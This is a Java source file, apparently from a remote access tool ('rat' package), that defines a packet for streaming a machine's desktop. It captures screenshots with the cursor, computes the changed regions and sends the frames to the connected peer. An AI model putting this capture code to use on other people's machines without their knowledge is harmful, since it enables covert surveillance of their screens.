package de.sogomn.rat.packet;

import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.stream.Stream;

import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.FrameEncoder;
import de.sogomn.rat.util.FrameEncoder.IFrame;

public final class DesktopStreamPacket extends AbstractPingPongPacket {
	
	private IFrame[] frames;
	private int screenWidth, screenHeight;
	
	private byte deleteLastScreenshot;
	
	private static BufferedImage lastScreenshot;
	
	private static final byte KEEP = 0;
	private static final byte DELETE = 1;
	
	private static final byte INCOMING = 1;
	private static final byte END = 0;
	
	public DesktopStreamPacket(final boolean delete) {
		type = REQUEST;
		deleteLastScreenshot = delete ? DELETE : KEEP;
	}
	
	public DesktopStreamPacket() {
		this(false);
	}
	
	@Override
	protected void sendRequest(final ActiveConnection client) {
		client.writeByte(deleteLastScreenshot);
	}
	
	@Override
	protected void sendData(final ActiveConnection client) {
		Stream.of(frames).forEach(frame -> {
			final byte[] data = ImageUtils.toByteArray(frame.image, 0);
			
			client.writeByte(INCOMING);
			client.writeShort((short)frame.x);
			client.writeShort((short)frame.y);
			client.writeInt(data.length);
			client.write(data);
		});
		
		client.writeByte(END);
		client.writeInt(screenWidth);
		client.writeInt(screenHeight);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection client) {
		deleteLastScreenshot = client.readByte();
	}
	
	@Override
	protected void receiveData(final ActiveConnection client) {
		final ArrayList<IFrame> framesList = new ArrayList<IFrame>();
		
		while (client.readByte() == INCOMING) {
			final int x = client.readShort();
			final int y = client.readShort();
			final int length = client.readInt();
			final byte[] data = new byte[length];
			
			client.read(data);
			
			final BufferedImage image = ImageUtils.toImage(data);
			final IFrame frame = new IFrame(x, y, image);
			
			framesList.add(frame);
		}
		
		frames = framesList.stream().toArray(IFrame[]::new);
		screenWidth = client.readInt();
		screenHeight = client.readInt();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection client) {
		final BufferedImage screenshot = FrameEncoder.takeScreenshotWithCursor();
		
		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
			final IFrame frame = new IFrame(0, 0, screenshot);
			
			frames = new IFrame[1];
			frames[0] = frame;
		} else if (deleteLastScreenshot == KEEP) {
			frames = FrameEncoder.getIFrames(lastScreenshot, screenshot);
		} else {
			frames = new IFrame[0];
		}
		
		type = DATA;
		screenWidth = screenshot.getWidth();
		screenHeight = screenshot.getHeight();
		lastScreenshot = screenshot;
		
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection client) {
		//...
	}
	
	public IFrame[] getFrames() {
		return frames;
	}
	
	public int getScreenWidth() {
		return screenWidth;
	}
	
	public int getScreenHeight() {
		return screenHeight;
	}
	
}
